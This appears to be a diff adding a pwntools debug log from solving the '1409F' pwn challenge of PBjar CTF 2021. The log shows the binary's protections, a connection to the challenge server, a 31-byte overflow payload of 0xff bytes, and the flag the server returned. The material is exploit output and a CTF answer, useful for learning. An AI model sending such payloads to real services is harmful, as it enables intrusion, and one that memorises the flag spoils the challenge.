@@ -1,0 +1,38 @@
+[DEBUG] PLT 0x1030 puts
+[DEBUG] PLT 0x1040 setbuf
+[DEBUG] PLT 0x1050 printf
+[DEBUG] PLT 0x1060 __assert_fail
+[DEBUG] PLT 0x1070 memset
+[DEBUG] PLT 0x1080 fgets
+[DEBUG] PLT 0x1090 getchar
+[DEBUG] PLT 0x10a0 memcpy
+[DEBUG] PLT 0x10b0 gets
+[DEBUG] PLT 0x10c0 fopen
+[DEBUG] PLT 0x10d0 __isoc99_scanf
+[DEBUG] PLT 0x10e0 exit
+[DEBUG] PLT 0x10f0 __cxa_finalize
+[*] '/home/mito/CTF/PBjar_CTF_2021/Pwn_1409F/1409F/1409F'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to 143.198.127.103 on port 42000: Done
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Sent 0x1f bytes:
+    00000000  fe fe ff ff  ff ff ff ff  ff ff ff ff  ff ff ff ff  │····│····│····│····│
+    00000010  ff ff ff ff  ff ff ff ff  ff ff ff ff  ff ff 0a     │····│····│····│···│
+    0000001f
+[*] Switching to interactive mode
+[DEBUG] Received 0x61 bytes:
+    b"Uh oh, this isn't supposed to happen.\n"
+    b'DEBUG:\n'
+    b'flag{y0u_c4n_0v3rfl0w_m0r3_th4n_just_th3_st4ck}\n'
+    b'\n'
+    b'-1\n'
+Uh oh, this isn't supposed to happen.
+DEBUG:
+flag{y0u_c4n_0v3rfl0w_m0r3_th4n_just_th3_st4ck}
